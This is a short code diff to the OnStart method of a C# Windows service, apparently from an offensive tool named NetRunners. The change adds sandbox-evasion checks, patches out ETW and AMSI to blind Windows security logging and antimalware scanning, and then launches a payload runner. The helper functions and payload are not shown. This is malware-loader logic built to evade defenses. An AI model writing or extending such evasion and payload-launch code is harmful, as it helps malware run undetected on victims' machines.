@@ -20,16 +20,18 @@ namespace NetRunners
         protected override void OnStart(string[] args)
         {
             // call heuristic functions
-            if (Sleep()) { return; }    // if sleep was skipped halt execution
-            if (NonEmulated()) { return; }    // if apis were not emulatd halt execution
-
-            // call amsi patch
-            patchAmsi();
+            if ((!Sleep()) || (!NonEmulated()))
+            {
+                return;
+            }
+            // call patchers
+            if ((!PatchEtw()) || (!PatchAmsi()))
+                return;
 
             // call desired function (uncomment choice)
             // PiRunner();
             // Runner();
-            epsRun();
+            EpsRun();
         }
 
         protected override void OnStop()
